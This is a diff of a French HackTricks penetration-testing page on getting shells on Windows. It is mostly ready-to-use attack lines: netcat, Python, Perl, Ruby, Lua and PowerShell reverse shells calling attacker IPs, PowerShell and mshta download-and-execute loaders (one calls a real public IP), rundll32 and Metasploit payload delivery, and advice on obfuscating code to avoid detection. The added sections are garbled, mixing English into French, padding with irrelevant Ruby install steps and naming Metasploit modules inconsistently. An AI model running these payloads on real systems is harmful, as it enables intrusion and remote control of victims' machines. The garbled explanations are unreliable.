@@ -4,10 +4,10 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
@@ -18,14 +18,14 @@
 
 🐞 Lisez les tutoriels sur les bugs web3
 
-🔔 Recevez des notifications sur les nouveaux programmes de primes pour bugs
+🔔 Recevez des notifications sur les nouvelles primes de bugs
 
 💬 Participez aux discussions de la communauté
 
 ## Lolbas
 
 La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows ce que [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
-Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo sous Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal)utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire.**
+Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal)utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire**.
 
 ## NC
 ```bash
@@ -33,28 +33,65 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**sbd** est un clone de Netcat, conçu pour être portable et offrir un cryptage fort. Il fonctionne sur des systèmes d'exploitation de type Unix et sur Microsoft Win32. sbd prend en charge le cryptage AES-CBC-128 + HMAC-SHA1 (par Christophe Devine), l'exécution de programmes (option -e), le choix du port source, la reconnexion continue avec délai et quelques autres fonctionnalités intéressantes. sbd ne prend en charge que la communication TCP/IP. sbd.exe (faisant partie de la distribution Kali Linux : /usr/share/windows-resources/sbd/sbd.exe) peut être téléchargé sur une machine Windows en tant qu'alternative à Netcat.
+**sbd** est un clone de Netcat, conçu pour être portable et offrir un cryptage solide. Il fonctionne sur les systèmes d'exploitation de type Unix et sur Microsoft Win32. sbd propose un cryptage AES-CBC-128 + HMAC-SHA1 (par Christophe Devine), l'exécution de programmes (option -e), le choix du port source, la reconnexion continue avec délai, et d'autres fonctionnalités intéressantes. sbd ne prend en charge que la communication TCP/IP. sbd.exe (faisant partie de la distribution Kali Linux : /usr/share/windows-resources/sbd/sbd.exe) peut être téléchargé sur une machine Windows en tant qu'alternative à Netcat.
+
+## Python
 ```bash
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
-## Perl
+Perl est un langage de script polyvalent et puissant qui peut être utilisé pour créer des shells sur des systèmes Windows. Il offre de nombreuses fonctionnalités utiles pour les hackers, telles que la manipulation de fichiers, l'exécution de commandes système et la communication avec des serveurs distants.
 
-Perl est un langage de programmation interprété, souvent utilisé pour l'automatisation de tâches système et la manipulation de fichiers. Il est également utilisé dans le développement web pour la création de scripts CGI. Perl est souvent utilisé dans les outils de hacking en raison de sa flexibilité et de sa capacité à manipuler des données de manière efficace.
+Pour créer un shell Perl sur un système Windows, vous pouvez utiliser le module `Net::Telnet` qui permet d'établir une connexion à distance avec un serveur. Vous pouvez également utiliser le module `Win32::Console` pour manipuler la console Windows et exécuter des commandes système.
+
+Une fois que vous avez établi une connexion à distance avec un serveur, vous pouvez exécuter des commandes système en utilisant la fonction `cmd` de Perl. Par exemple, vous pouvez exécuter la commande `dir` pour afficher le contenu d'un répertoire ou la commande `ipconfig` pour afficher les informations réseau.
+
+Perl offre également des fonctionnalités pour la manipulation de fichiers, telles que la lecture, l'écriture et la suppression de fichiers. Vous pouvez utiliser les fonctions `open`, `read`, `write` et `unlink` pour effectuer ces opérations.
+
+En résumé, Perl est un langage de script puissant qui peut être utilisé pour créer des shells sur des systèmes Windows. Il offre de nombreuses fonctionnalités utiles pour les hackers, telles que la manipulation de fichiers, l'exécution de commandes système et la communication avec des serveurs distants.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby est un langage de programmation interprété et orienté objet. Il est souvent utilisé pour le développement web et est également populaire dans le domaine de la sécurité informatique en raison de sa flexibilité et de sa facilité d'utilisation. Ruby est souvent utilisé pour écrire des scripts de hacking en raison de sa syntaxe concise et de sa capacité à manipuler facilement les chaînes de caractères.
+Ruby est un langage de programmation dynamique et orienté objet qui est souvent utilisé pour le développement web. Il est connu pour sa syntaxe élégante et sa facilité d'utilisation. Ruby offre une grande variété de fonctionnalités et de bibliothèques qui peuvent être utilisées pour créer des scripts et des applications puissantes.
+
+### Installation de Ruby
+
+Pour commencer à utiliser Ruby, vous devez d'abord l'installer sur votre système. Voici les étapes pour installer Ruby sur Windows :
+
+1. Téléchargez le programme d'installation Ruby pour Windows à partir du site officiel de Ruby (https://www.ruby-lang.org/en/downloads/).
+2. Exécutez le programme d'installation et suivez les instructions à l'écran.
+3. Sélectionnez le répertoire d'installation de Ruby (par défaut, il est recommandé de le laisser tel quel).
+4. Cochez la case "Add Ruby executables to your PATH" pour ajouter Ruby à votre variable d'environnement PATH.
+5. Cliquez sur le bouton "Install" pour lancer l'installation de Ruby.
+6. Une fois l'installation terminée, ouvrez une nouvelle fenêtre de terminal et exécutez la commande `ruby -v` pour vérifier que Ruby a été installé avec succès.
+
+### Utilisation de Ruby
+
+Ruby est un langage de script interprété, ce qui signifie que vous pouvez exécuter du code Ruby directement à partir d'un fichier texte. Voici comment créer et exécuter un script Ruby :
+
+1. Ouvrez un éditeur de texte et créez un nouveau fichier avec l'extension `.rb` (par exemple, `mon_script.rb`).
+2. Ajoutez votre code Ruby dans le fichier. Par exemple, vous pouvez écrire `puts "Bonjour, monde !"` pour afficher le message "Bonjour, monde !" à l'écran.
+3. Enregistrez le fichier et fermez l'éditeur de texte.
+4. Ouvrez une fenêtre de terminal et naviguez jusqu'au répertoire où vous avez enregistré votre fichier Ruby.
+5. Exécutez la commande `ruby mon_script.rb` pour exécuter le script Ruby. Vous devriez voir le message "Bonjour, monde !" s'afficher à l'écran.
+
+### Ressources supplémentaires
+
+Ruby dispose d'une vaste communauté de développeurs qui partagent leurs connaissances et leurs ressources en ligne. Voici quelques ressources supplémentaires pour en savoir plus sur Ruby :
+
+- [Site officiel de Ruby](https://www.ruby-lang.org/fr/)
+- [Ruby-Doc.org](https://ruby-doc.org/)
+- [RubyGems.org](https://rubygems.org/)
+
+En utilisant ces ressources, vous pouvez approfondir vos connaissances en Ruby et découvrir de nouvelles bibliothèques et frameworks pour améliorer vos compétences en développement.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-## Lua
-
-Lua est un langage de programmation léger, rapide et facile à apprendre. Il est souvent utilisé pour l'écriture de scripts et d'extensions dans des applications plus grandes. Lua est également utilisé dans des jeux vidéo populaires tels que World of Warcraft et Angry Birds. Lua est souvent intégré à des applications en tant que langage de script pour permettre aux utilisateurs de personnaliser et d'étendre les fonctionnalités de l'application.
+Lua est un langage de programmation léger, extensible et puissant. Il est souvent utilisé dans le développement de jeux vidéo et d'applications embarquées. Lua est également utilisé comme langage de script dans diverses applications et environnements. Il est facile à apprendre et à intégrer dans d'autres langages de programmation. Lua offre une syntaxe simple et concise, ce qui en fait un choix populaire parmi les développeurs.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -66,7 +103,61 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Victime
+# Shells Windows
+
+## Introduction
+
+In the context of penetration testing, a shell is a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on Windows systems.
+
+## Netcat
+
+Netcat is a versatile networking utility that can be used to establish a reverse shell on a Windows machine. The basic idea is to listen for incoming connections on the attacker's machine and redirect the shell to that machine.
+
+To set up a reverse shell using Netcat, follow these steps:
+
+1. On the attacker's machine, open a terminal and start listening for incoming connections:
+
+   ```bash
+   nc -lvp <port>
+   ```
+
+2. On the victim's machine, execute the following command to establish a connection with the attacker's machine:
+
+   ```bash
+   nc <attacker_ip> <port> -e cmd.exe
+   ```
+
+   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
+
+3. Once the connection is established, the attacker will have a shell on the victim's machine.
+
+## PowerShell
+
+PowerShell is a powerful scripting language and command-line shell that is built into Windows. It provides a wide range of functionalities for system administration and automation. In the context of penetration testing, PowerShell can be used to execute commands on a compromised Windows system.
+
+To obtain a shell using PowerShell, follow these steps:
+
+1. On the victim's machine, open a PowerShell session.
+
+2. Execute the following command to enable remote command execution:
+
+   ```powershell
+   Set-ExecutionPolicy Bypass -Scope Process -Force
+   ```
+
+3. Execute the following command to establish a reverse shell with the attacker's machine:
+
+   ```powershell
+   powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+   ```
+
+   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
+
+4. Once the connection is established, the attacker will have a shell on the victim's machine.
+
+## Conclusion
+
+Obtaining a shell on a Windows system is a crucial step in the penetration testing process. By using tools like Netcat and PowerShell, an attacker can gain control over a compromised system and perform further actions to achieve their objectives. It is important to note that these techniques should only be used for ethical purposes and with proper authorization.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -76,34 +167,35 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 ```
 ## Powershell
 
-Powershell est un interpréteur de commandes et un langage de script développé par Microsoft pour les systèmes Windows. Il est basé sur le framework .NET et permet d'automatiser des tâches administratives, de gérer des configurations système et de manipuler des données.
+Powershell est un puissant langage de script et une interface en ligne de commande développée par Microsoft. Il est principalement utilisé pour l'automatisation des tâches système et l'administration de Windows. Powershell offre une grande variété de fonctionnalités et de commandes qui permettent aux administrateurs système d'effectuer des opérations complexes et de gérer efficacement les systèmes Windows.
 
-### Exécution de scripts Powershell
+### Utilisation de Powershell pour l'exploitation
 
-Pour exécuter un script Powershell, il suffit de lancer l'interpréteur de commandes Powershell et de spécifier le chemin vers le script à exécuter. Par exemple :
+Powershell peut également être utilisé par les hackers pour l'exploitation des systèmes Windows. Il offre un large éventail de fonctionnalités qui peuvent être utilisées pour exécuter des commandes malveillantes, accéder à des informations sensibles et compromettre la sécurité des systèmes.
 
-```
-powershell.exe -ExecutionPolicy Bypass -File C:\chemin\vers\script.ps1
-```
+#### Exécution de commandes malveillantes
 
-L'option `-ExecutionPolicy Bypass` permet de contourner la politique de sécurité de Powershell qui empêche l'exécution de scripts non signés ou provenant de sources non fiables.
+Powershell permet aux hackers d'exécuter des commandes malveillantes sur des systèmes Windows compromis. Ils peuvent utiliser des scripts Powershell pour exécuter des actions telles que l'installation de logiciels malveillants, la suppression de fichiers, la modification des paramètres système, etc.
 
-### Utilisation de l'API .NET depuis Powershell
+#### Accès à des informations sensibles
 
-Powershell permet d'accéder à toutes les fonctionnalités de l'API .NET, ce qui offre une grande flexibilité pour la manipulation de données et la création d'outils personnalisés. Par exemple, pour utiliser la classe `System.Net.WebClient` pour télécharger un fichier depuis une URL :
+En exploitant les fonctionnalités de Powershell, les hackers peuvent accéder à des informations sensibles stockées sur des systèmes Windows. Ils peuvent extraire des mots de passe, des informations d'identification, des données personnelles, etc. en utilisant des commandes Powershell spécifiques.
 
-```
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("http://example.com/file.txt", "C:\chemin\vers\file.txt")
-```
+#### Compromission de la sécurité des systèmes
 
-### Utilisation de Powershell pour l'attaque
+Powershell peut également être utilisé pour compromettre la sécurité des systèmes Windows. Les hackers peuvent utiliser des techniques telles que l'injection de code malveillant dans des scripts Powershell légitimes, l'exploitation de vulnérabilités connues dans Powershell, etc. pour compromettre la sécurité des systèmes.
 
-Powershell est un outil très puissant pour l'attaque car il permet d'exécuter des commandes à distance, de manipuler des fichiers et des données, et d'interagir avec des API. Il est souvent utilisé pour lancer des attaques de type "fileless" qui ne laissent pas de traces sur le disque dur de la victime.
+### Contre-mesures
 
-### Utilisation de Powershell pour la défense
+Pour se protéger contre les attaques utilisant Powershell, il est recommandé de prendre les mesures suivantes :
 
-Powershell peut également être utilisé pour la défense en automatisant des tâches de surveillance et de détection d'activités suspectes. Par exemple, en surveillant les événements de création de processus Powershell ou en détectant l'utilisation de commandes Powershell malveillantes.
+- Limiter les privilèges d'accès de Powershell aux utilisateurs et aux systèmes qui en ont réellement besoin.
+- Mettre en place des mécanismes de détection et de prévention des attaques utilisant Powershell, tels que des systèmes de détection d'intrusion et des pare-feu.
+- Mettre à jour régulièrement Powershell et les systèmes Windows pour bénéficier des derniers correctifs de sécurité.
+- Former les utilisateurs et les administrateurs système sur les bonnes pratiques de sécurité liées à l'utilisation de Powershell.
+- Surveiller les activités suspectes liées à Powershell et prendre des mesures immédiates en cas de détection d'une activité malveillante.
+
+En suivant ces contre-mesures, il est possible de réduire considérablement les risques liés à l'utilisation de Powershell dans le cadre d'attaques.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -118,13 +210,25 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 Processus effectuant un appel réseau : **svchost.exe**\
 Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
-**Ligne unique :**
+**Ligne de commande :**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Obtenez plus d'informations sur les différentes Shells Powershell à la fin de ce document**
+Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.
 
-## Mshta
+Mshta can be used as a shell for executing malicious code on a target system. It can be leveraged to bypass security measures and execute scripts or commands with elevated privileges.
+
+To use Mshta as a shell, you can create an HTA file containing your malicious code and then execute it using the following command:
+
+```
+mshta.exe <path_to_hta_file>
+```
+
+Once executed, the HTA file will run and execute the embedded code, allowing you to perform various actions on the target system.
+
+It is important to note that the use of Mshta as a shell may raise suspicion, as it is not a commonly used utility. Therefore, it is crucial to employ obfuscation techniques to hide the malicious code and avoid detection.
+
+For more information on different Powershell shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -141,9 +245,9 @@ mshta \\webdavserver\folder\payload.hta
 Processus effectuant un appel réseau : **svchost.exe**\
 Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
-#### **Exemple de shell inversé hta-psh (utilisation d'hta pour télécharger et exécuter une porte dérobée PS)**
+#### **Exemple de shell inversé hta-psh (utilise hta pour télécharger et exécuter une porte dérobée PS)**
 ```markup
- <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
+<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
 **Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager hta**
 
@@ -153,8 +257,8 @@ Charge utile écrite sur le disque : **Cache local du client WebDAV**
 <head>
 <HTA:APPLICATION ID="HelloExample">
 <script language="jscript">
-        var c = "cmd.exe /c calc.exe"; 
-        new ActiveXObject('WScript.Shell').Run(c);
+var c = "cmd.exe /c calc.exe";
+new ActiveXObject('WScript.Shell').Run(c);
 </script>
 </head>
 <body>
@@ -164,15 +268,23 @@ Charge utile écrite sur le disque : **Cache local du client WebDAV**
 ```
 #### **mshta - sct**
 
-La technique `mshta - sct` est une méthode courante pour exécuter du code arbitraire sur une machine Windows. Elle consiste à utiliser `mshta.exe` pour exécuter un fichier `.sct` (Scriptlet Text) qui contient du code VBScript ou JScript. Le fichier `.sct` est généralement hébergé sur un serveur distant et téléchargé sur la machine cible via une requête HTTP.
+La technique `mshta - sct` est une méthode couramment utilisée pour exécuter du code malveillant sur des systèmes Windows. Elle exploite l'utilitaire `mshta.exe` qui est présent sur tous les systèmes Windows.
 
-Voici un exemple de commande pour exécuter un fichier `.sct` à distance:
+L'extension de fichier `.sct` est utilisée pour stocker le code VBScript ou JScript qui sera exécuté par `mshta.exe`. Cette extension permet de contourner les mécanismes de sécurité de Windows, car elle est considérée comme un fichier de script légitime.
+
+Pour exécuter du code malveillant à l'aide de `mshta - sct`, vous devez d'abord créer un fichier `.sct` contenant le code que vous souhaitez exécuter. Ensuite, vous devez utiliser la commande `mshta.exe` pour exécuter ce fichier `.sct`. Le code malveillant sera alors exécuté avec les privilèges de l'utilisateur en cours.
+
+Il est important de noter que l'utilisation de cette technique peut être détectée par les antivirus et les outils de sécurité. Par conséquent, il est recommandé de prendre des mesures supplémentaires pour masquer le code malveillant et éviter la détection.
+
+Voici un exemple de commande pour exécuter un fichier `.sct` malveillant avec `mshta.exe` :
 
 ```
-mshta.exe http://<attacker_ip>/file.sct
+mshta.exe "file://C:/path/to/malicious.sct"
 ```
 
-Il est important de noter que cette technique peut être détectée par les solutions de sécurité modernes, car elle est souvent utilisée dans des attaques de phishing et de malvertising.
+Assurez-vous de remplacer `C:/path/to/malicious.sct` par le chemin d'accès réel vers votre fichier `.sct` malveillant.
+
+Cette technique peut être utilisée lors d'une attaque de phishing, d'une exploitation de vulnérabilité ou d'une infiltration de système. Il est essentiel de comprendre les risques associés à cette technique et de l'utiliser de manière responsable et légale.
 ```markup
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -183,51 +295,26 @@ Il est important de noter que cette technique peut être détectée par les solu
 </public>
 <script language="JScript">
 <![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ]]>
 </script>
 </scriptlet>
 ```
 #### **Mshta - Metasploit**
 
-#### Mshta - Metasploit
+Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It is often used by attackers to bypass security measures and execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that can be used to exploit this vulnerability.
 
-Mshta is a Microsoft utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta and are treated as HTML files but executed as applications. Mshta.exe is installed by default on Windows systems.
+To use the `mshta` module in Metasploit, follow these steps:
 
-Metasploit has a module that allows you to execute an HTA file on a target system using Mshta. The module is called `exploit/windows/browser/mshta\_hta`.
+1. Start Metasploit by running the `msfconsole` command.
+2. Search for the `mshta` module using the `search` command: `search mshta`.
+3. Load the `mshta` module using the `use` command followed by the module name: `use exploit/windows/browser/mshta`.
+4. Set the required options for the module. You can use the `show options` command to view the available options and the `set` command to set their values.
+5. Run the exploit using the `exploit` command.
 
-##### Usage
+Once the exploit is successful, you will have a Meterpreter session on the target system, giving you full control over it. From there, you can perform various post-exploitation activities, such as privilege escalation, lateral movement, and data exfiltration.
 
-```
-msf > use exploit/windows/browser/mshta_hta
-msf exploit(mshta_hta) > set payload windows/meterpreter/reverse_tcp
-msf exploit(mshta_hta) > set lhost <attacker IP>
-msf exploit(mshta_hta) > set srvhost <attacker IP>
-msf exploit(mshta_hta) > set uripath /payload.hta
-msf exploit(mshta_hta) > exploit
-```
-
-This will create a web server on the attacker's machine and serve the HTA file. When the target system executes the HTA file, a Meterpreter session will be created on the attacker's machine.
-
-##### Mshta - HTA - PowerShell
-
-Mshta can also be used to execute PowerShell commands on a target system. This can be done by embedding the PowerShell commands in an HTA file and executing it using Mshta.
-
-```
-mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/Arno0x/PowerShellScripts/master/Invoke-Mimikatz.ps1");close(Execute(a))
-```
-
-This command will download the Invoke-Mimikatz PowerShell script from GitHub and execute it on the target system.
-
-##### Mshta - HTA - JavaScript
-
-Mshta can also be used to execute JavaScript on a target system. This can be done by embedding the JavaScript code in an HTA file and executing it using Mshta.
-
-```
-mshta.exe javascript:alert("Hello, world!");
-```
-
-This command will display an alert box with the message "Hello, world!" on the target system.
+It is important to note that using Metasploit or any other hacking tool without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before conducting any penetration testing activities.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -238,11 +325,11 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Détecté par Defender**
+**Détecté par le défenseur**
 
 ## **Rundll32**
 
-[**Exemple de Dll hello world**](https://github.com/carterjones/hello-world-dll)
+[**Exemple de DLL hello world**](https://github.com/carterjones/hello-world-dll)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -266,20 +353,28 @@ Charge utile écrite sur le disque : **cache local d'IE**
 </public>
 <script language="JScript">
 <![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ]]>
 </script>
 </scriptlet>
 ```
 #### **Rundll32 - Metasploit**
 
-Le module Metasploit `windows/local/metinject` permet d'injecter un payload dans un processus distant en utilisant la commande `rundll32.exe`. 
+Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be exploited by an attacker to execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32, allowing the attacker to gain control over the target system.
 
-Le payload est injecté dans la mémoire du processus cible en utilisant la fonction `LoadLibrary` de `rundll32.exe`. 
+To use this technique, follow these steps:
 
-Le module `windows/local/metinject` peut être utilisé pour injecter un payload dans un processus distant en utilisant la commande `rundll32.exe`. 
+1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit.
+2. Transfer the HTA file to the target system.
+3. Execute the HTA file using Rundll32 with the following command:
 
-Le payload est injecté dans la mémoire du processus cible en utilisant la fonction `LoadLibrary` de `rundll32.exe`.
+```
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<attacker_ip>/payload.hta");
+```
+
+Replace `<attacker_ip>` with the IP address of the machine running the Metasploit framework.
+
+By executing the HTA file with Rundll32, the attacker can run arbitrary code on the target system and gain control over it. This technique can be used to escalate privileges, install backdoors, or perform other malicious activities. It is important to note that this technique may trigger antivirus alerts, so additional evasion techniques may be necessary to bypass detection.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -287,17 +382,15 @@ run
 ```
 **Rundll32 - Koadic**
 
-La technique Rundll32 est souvent utilisée pour exécuter des commandes malveillantes sur des systèmes Windows. Koadic est un outil de post-exploitation qui permet aux attaquants d'exécuter des commandes à distance sur des systèmes Windows compromis. En utilisant Rundll32 pour exécuter Koadic, les attaquants peuvent contourner les défenses de sécurité en utilisant un processus légitime de Windows pour exécuter des commandes malveillantes.
+Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes this technique is Koadic.
 
-Pour utiliser cette technique, les attaquants doivent d'abord charger le module Koadic dans la mémoire du système compromis. Ensuite, ils peuvent utiliser la commande Rundll32 pour exécuter le module Koadic en utilisant la syntaxe suivante :
